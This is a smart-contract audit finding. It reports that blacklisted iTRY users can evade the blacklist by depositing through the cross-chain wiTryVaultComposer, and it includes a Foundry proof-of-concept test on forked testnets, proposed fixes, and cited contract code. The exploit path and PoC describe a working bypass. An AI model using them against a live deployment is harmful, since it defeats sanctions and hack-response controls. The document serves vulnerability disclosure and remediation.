## Title
Blacklisted iTRY Users Can Bypass Blacklist Through Cross-Chain Composer Deposits

## Summary
The `wiTryVaultComposer.handleCompose()` function allows blacklisted iTRY users to bypass blacklist restrictions when depositing iTRY cross-chain to stake into the wiTRY vault. The vulnerability occurs because the original user's blacklist status is never validated during the cross-chain deposit flow, only the composer contract's status is checked.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/token/wiTRY/crosschain/wiTryVaultComposer.sol` (line 72), `src/token/wiTRY/crosschain/libraries/VaultComposerSync.sol` (lines 206-238) [1](#0-0) [2](#0-1) 

**Intended Logic:** According to the protocol invariant, "Blacklisted users cannot send/receive/mint/burn iTRY tokens in any case." When a user sends iTRY cross-chain to stake, the system should validate that the original sender is not blacklisted before processing the deposit. [3](#0-2) 

**Actual Logic:** When `_oftIn == ASSET_OFT` at line 72, the composer calls `_depositAndSend(_composeFrom, _amount, sendParam, address(this))` where `_composeFrom` represents the original cross-chain user. However, the `_deposit()` function completely ignores the `_depositor` parameter and calls `VAULT.deposit(_assetAmount, address(this))`, depositing from the composer to the vault. When iTRY tokens are transferred during this deposit, the `_beforeTokenTransfer` hook only validates that the composer, vault, and msg.sender are not blacklisted - it never checks if the original user (`_composeFrom`) is blacklisted. [4](#0-3) 

**Exploitation Path:**
1. User is blacklisted on iTRY L1 (hub chain) but has iTRY on L2 (spoke chain) where they are not blacklisted
2. User sends iTRY from L2 to L1 wiTryVaultComposer with a compose message to stake
3. LayerZero delivers the iTRY to the composer and triggers `lzCompose()` → `handleCompose()`
4. The composer calls `_depositAndSend()` which deposits iTRY into the vault, transferring from composer → vault
5. During the iTRY transfer, `_beforeTokenTransfer()` checks `msg.sender`, `from` (composer), and `to` (vault) - all non-blacklisted
6. The deposit succeeds, minting wiTRY shares that are sent back to the blacklisted user cross-chain
7. The blacklisted user now has wiTRY representing their iTRY, can earn yield, and can later unstake to receive iTRY back

**Security Property Broken:** Violates the critical invariant "Blacklisted users cannot send/receive/mint/burn iTRY tokens in any case" - the blacklisted user's iTRY was transferred (deposited into vault) despite the blacklist.

## Impact Explanation
- **Affected Assets**: iTRY tokens, wiTRY vault shares, protocol blacklist enforcement mechanism
- **Damage Severity**: Complete bypass of iTRY blacklist restrictions. Blacklisted users can continue using the protocol through cross-chain operations, defeating the purpose of blacklisting (e.g., regulatory compliance, hack response, sanctions enforcement)
- **User Impact**: All blacklisted users on L1 can bypass restrictions if they have access to L2. This undermines the protocol's ability to respond to security incidents, comply with regulations, or enforce sanctions

## Likelihood Explanation
- **Attacker Profile**: Any user blacklisted on iTRY L1 who has iTRY on L2
- **Preconditions**: 
  - User must be blacklisted on L1 iTRY
  - User must have iTRY on L2 (not blacklisted there)
  - Cross-chain infrastructure must be operational
  - wiTryVaultComposer deployed and configured
- **Execution Complexity**: Single cross-chain transaction - user calls `send()` on L2 iTRY OFT with compose message
- **Frequency**: Unlimited - user can repeatedly deposit and unstake, continuously bypassing blacklist

## Recommendation

The `_deposit()` function in `VaultComposerSync.sol` should validate that the depositor is not blacklisted on iTRY before proceeding with the deposit. Since the depositor parameter is currently ignored, it should be utilized to perform this validation.

**Option 1: Add blacklist check in VaultComposerSync._deposit():**

```solidity
// In src/token/wiTRY/crosschain/libraries/VaultComposerSync.sol, lines 228-238:

// CURRENT (vulnerable):
function _deposit(
    bytes32, /*_depositor*/
    uint256 _assetAmount
)
    internal
    virtual
    returns (uint256 shareAmount)
{
    shareAmount = VAULT.deposit(_assetAmount, address(this));
}

// FIXED:
function _deposit(
    bytes32 _depositor,
    uint256 _assetAmount
)
    internal
    virtual
    returns (uint256 shareAmount)
{
    // Validate depositor is not blacklisted on the asset token
    address depositorAddr = OFTComposeMsgCodec.bytes32ToAddress(_depositor);
    require(depositorAddr != address(0), "Invalid depositor");
    
    // Check if asset is iTRY and validate blacklist status
    // This requires the asset token to expose blacklist check function
    // or maintain a separate blacklist manager reference
    require(!IiTry(ASSET_ERC20).hasRole(BLACKLISTED_ROLE, depositorAddr), 
            "Depositor is blacklisted");
    
    shareAmount = VAULT.deposit(_assetAmount, address(this));
}
```

**Option 2: Override _deposit in wiTryVaultComposer to add validation:**

```solidity
// In src/token/wiTRY/crosschain/wiTryVaultComposer.sol, add:

function _deposit(
    bytes32 _depositor,
    uint256 _assetAmount
)
    internal
    override
    returns (uint256 shareAmount)
{
    address depositorAddr = _depositor.bytes32ToAddress();
    if (depositorAddr == address(0)) revert InvalidZeroAddress();
    
    // Validate depositor is not blacklisted on iTRY
    if (IiTry(ASSET_ERC20).hasRole(BLACKLISTED_ROLE, depositorAddr)) {
        revert OperationNotAllowed();
    }
    
    // Proceed with deposit
    shareAmount = VAULT.deposit(_assetAmount, address(this));
}
```

**Alternative Mitigation**: Consider implementing a pre-validation step in `handleCompose()` that checks the `_composeFrom` address against the iTRY blacklist before routing to any operation.

## Proof of Concept

```solidity
// File: test/Exploit_BlacklistBypassViaComposer.t.sol
// Run with: forge test --match-test test_BlacklistBypassViaComposer -vvv

pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {CrossChainTestBase} from "./crosschainTests/crosschain/CrossChainTestBase.sol";
import {wiTryVaultComposer} from "../src/token/wiTRY/crosschain/wiTryVaultComposer.sol";
import {MessagingFee, SendParam} from "@layerzerolabs/lz-evm-oapp-v2/contracts/oft/interfaces/IOFT.sol";
import {OptionsBuilder} from "@layerzerolabs/lz-evm-oapp-v2/contracts/oapp/libs/OptionsBuilder.sol";

contract Exploit_BlacklistBypassViaComposer is CrossChainTestBase {
    using OptionsBuilder for bytes;

    wiTryVaultComposer public composer;
    uint256 constant DEPOSIT_AMOUNT = 100 ether;
    address public blacklistedUser;
    bytes32 public constant BLACKLISTED_ROLE = keccak256("BLACKLISTED_ROLE");

    function setUp() public override {
        super.setUp();
        
        // Deploy all crosschain contracts
        deployAllContracts();
        
        // Deploy composer on L1
        vm.selectFork(sepoliaForkId);
        vm.prank(deployer);
        composer = new wiTryVaultComposer(
            address(sepoliaVault), 
            address(sepoliaAdapter), 
            address(sepoliaShareAdapter), 
            SEPOLIA_ENDPOINT
        );
        
        // Create blacklisted user
        blacklistedUser = makeAddr("blacklistedUser");
        
        // Fund blacklisted user on both chains
        vm.selectFork(sepoliaForkId);
        vm.deal(blacklistedUser, 100 ether);
        vm.selectFork(opSepoliaForkId);
        vm.deal(blacklistedUser, 100 ether);
        
        // Give user iTRY on L2
        _transferITryToL2(blacklistedUser, DEPOSIT_AMOUNT * 2);
        
        // Blacklist the user on L1 iTRY token
        vm.selectFork(sepoliaForkId);
        address[] memory users = new address[](1);
        users[0] = blacklistedUser;
        vm.prank(deployer);
        sepoliaITryToken.addBlacklistAddress(users);
        
        console.log("=== Blacklist Bypass PoC Setup ===");
        console.log("Blacklisted user:", blacklistedUser);
        console.log("User is blacklisted on L1:", sepoliaITryToken.hasRole(BLACKLISTED_ROLE, blacklistedUser));
    }

    function test_BlacklistBypassViaComposer() public {
        console.log("\n=== EXPLOIT: Blacklisted User Deposits via Composer ===");
        
        // VERIFY: User is blacklisted on L1
        vm.selectFork(sepoliaForkId);
        bool isBlacklisted = sepoliaITryToken.hasRole(BLACKLISTED_ROLE, blacklistedUser);
        assertTrue(isBlacklisted, "User should be blacklisted on L1");
        console.log("Step 1: Verified user is blacklisted on L1 iTRY");
        
        // VERIFY: User cannot directly transfer iTRY on L1
        uint256 l1Balance = sepoliaITryToken.balanceOf(blacklistedUser);
        if (l1Balance > 0) {
            vm.prank(blacklistedUser);
            vm.expectRevert();
            sepoliaITryToken.transfer(userL1, 1 ether);
            console.log("Step 2: Confirmed user cannot transfer iTRY on L1");
        }
        
        // EXPLOIT: User sends iTRY from L2 with compose message
        vm.selectFork(opSepoliaForkId);
        uint256 userL2Balance = opSepoliaOFT.balanceOf(blacklistedUser);
        console.log("Step 3: User has iTRY on L2:", userL2Balance);
        
        vm.startPrank(blacklistedUser);
        
        // Build compose message for deposit
        SendParam memory innerSendParam = SendParam({
            dstEid: SEPOLIA_EID,
            to: bytes32(uint256(uint160(blacklistedUser))),
            amountLD: 0,
            minAmountLD: 0,
            extraOptions: "",
            composeMsg: "",
            oftCmd: ""
        });
        bytes memory composeMsg = abi.encode(innerSendParam, uint256(0));
        
        bytes memory options = OptionsBuilder.newOptions()
            .addExecutorLzReceiveOption(200000, 0)
            .addExecutorLzComposeOption(0, 500000, 0);
        
        SendParam memory sendParam = SendParam({
            dstEid: SEPOLIA_EID,
            to: bytes32(uint256(uint160(address(composer)))),
            amountLD: DEPOSIT_AMOUNT,
            minAmountLD: DEPOSIT_AMOUNT,
            extraOptions: options,
            composeMsg: composeMsg,
            oftCmd: ""
        });
        
        MessagingFee memory fee = opSepoliaOFT.quoteSend(sendParam, false);
        
        vm.recordLogs();
        opSepoliaOFT.send{value: fee.nativeFee}(sendParam, fee, payable(blacklistedUser));
        vm.stopPrank();
        
        console.log("Step 4: Blacklisted user sent iTRY from L2 to composer");
        
        // Relay the message
        CrossChainMessage memory message = captureMessage(OP_SEPOLIA_EID, SEPOLIA_EID);
        relayMessage(message);
        
        console.log("Step 5: Message relayed to L1");
        
        // VERIFY EXPLOIT SUCCESS: Blacklisted user received vault shares
        vm.selectFork(sepoliaForkId);
        uint256 blacklistedUserShares = sepoliaVault.balanceOf(blacklistedUser);
        
        console.log("\n=== EXPLOIT SUCCESSFUL ===");
        console.log("Blacklisted user vault shares:", blacklistedUserShares);
        assertGt(blacklistedUserShares, 0, "VULNERABILITY: Blacklisted user bypassed blacklist and received vault shares");
        
        // Verify iTRY was deposited into vault (user's iTRY is now in vault)
        uint256 vaultAssets = sepoliaVault.totalAssets();
        assertGe(vaultAssets, DEPOSIT_AMOUNT, "User's iTRY was deposited into vault");
        
        console.log("Vault total assets:", vaultAssets);
        console.log("\n[CRITICAL] Blacklisted user successfully bypassed iTRY blacklist");
        console.log("They can now earn yield and unstake later to receive iTRY back");
    }
}
```

## Notes

This vulnerability specifically affects the **cross-chain composer deposit flow** and represents a critical gap in blacklist enforcement. The issue stems from a design flaw where the `_depositor` parameter (containing the original user's address) is passed through the call stack but never actually used for security validation.

Key technical details:
1. The vulnerability is NOT the same as the known Zellic issue about allowance transfers - this is a completely separate cross-chain bypass
2. The check needs to happen BEFORE the deposit, as the iTRY transfer during deposit only sees the composer and vault addresses
3. This affects all cross-chain deposit operations where users send iTRY to the composer for staking
4. The same pattern may exist in the fast redeem flow (`_fastRedeem`) which should also be reviewed
5. The fix requires accessing the iTRY token's role management system from the composer, which may require interface additions

The vulnerability defeats the entire purpose of the blacklist mechanism, which is critical for regulatory compliance, hack response, and sanctions enforcement. Any blacklisted entity can simply use the L2→L1 composer flow to continue using the protocol unimpeded.

### Citations

**File:** src/token/wiTRY/crosschain/wiTryVaultComposer.sol (L61-84)
```text
    function handleCompose(address _oftIn, bytes32 _composeFrom, bytes memory _composeMsg, uint256 _amount)
        external
        payable
        override
    {
        if (msg.sender != address(this)) revert OnlySelf(msg.sender);

        (SendParam memory sendParam, uint256 minMsgValue) = abi.decode(_composeMsg, (SendParam, uint256));
        if (msg.value < minMsgValue) revert InsufficientMsgValue(minMsgValue, msg.value);

        if (_oftIn == ASSET_OFT) {
            _depositAndSend(_composeFrom, _amount, sendParam, address(this));
        } else if (_oftIn == SHARE_OFT) {
            if (keccak256(sendParam.oftCmd) == keccak256("INITIATE_COOLDOWN")) {
                _initiateCooldown(_composeFrom, _amount);
            } else if (keccak256(sendParam.oftCmd) == keccak256("FAST_REDEEM")) {
                _fastRedeem(_composeFrom, _amount, sendParam, address(this));
            } else {
                revert InitiateCooldownRequired();
            }
        } else {
            revert OnlyValidComposeCaller(_oftIn);
        }
    }
```

**File:** src/token/wiTRY/crosschain/libraries/VaultComposerSync.sol (L206-238)
```text
    function _depositAndSend(
        bytes32 _depositor,
        uint256 _assetAmount,
        SendParam memory _sendParam,
        address _refundAddress
    ) internal virtual {
        uint256 shareAmount = _deposit(_depositor, _assetAmount);
        _assertSlippage(shareAmount, _sendParam.minAmountLD);

        _sendParam.amountLD = shareAmount;
        _sendParam.minAmountLD = 0;

        _send(SHARE_OFT, _sendParam, _refundAddress);
        emit Deposited(_depositor, _sendParam.to, _sendParam.dstEid, _assetAmount, shareAmount);
    }

    /**
     * @dev Internal function to deposit assets into the vault
     * @param _assetAmount The number of assets to deposit into the vault
     * @return shareAmount The number of shares received from the vault deposit
     * @notice This function is expected to be overridden by the inheriting contract to implement custom/nonERC4626 deposit logic
     */
    function _deposit(
        bytes32,
        /*_depositor*/
        uint256 _assetAmount
    )
        internal
        virtual
        returns (uint256 shareAmount)
    {
        shareAmount = VAULT.deposit(_assetAmount, address(this));
    }
```

**File:** README.md (L124-124)
```markdown
- Blacklisted users cannot send/receive/mint/burn iTry tokens in any case.
```

**File:** src/token/iTRY/iTry.sol (L177-196)
```text
    function _beforeTokenTransfer(address from, address to, uint256) internal virtual override {
        // State 2 - Transfers fully enabled except for blacklisted addresses
        if (transferState == TransferState.FULLY_ENABLED) {
            if (hasRole(MINTER_CONTRACT, msg.sender) && !hasRole(BLACKLISTED_ROLE, from) && to == address(0)) {
                // redeeming
            } else if (hasRole(MINTER_CONTRACT, msg.sender) && from == address(0) && !hasRole(BLACKLISTED_ROLE, to)) {
                // minting
            } else if (hasRole(DEFAULT_ADMIN_ROLE, msg.sender) && hasRole(BLACKLISTED_ROLE, from) && to == address(0)) {
                // redistributing - burn
            } else if (hasRole(DEFAULT_ADMIN_ROLE, msg.sender) && from == address(0) && !hasRole(BLACKLISTED_ROLE, to))
            {
                // redistributing - mint
            } else if (
                !hasRole(BLACKLISTED_ROLE, msg.sender) && !hasRole(BLACKLISTED_ROLE, from)
                    && !hasRole(BLACKLISTED_ROLE, to)
            ) {
                // normal case
            } else {
                revert OperationNotAllowed();
            }
```
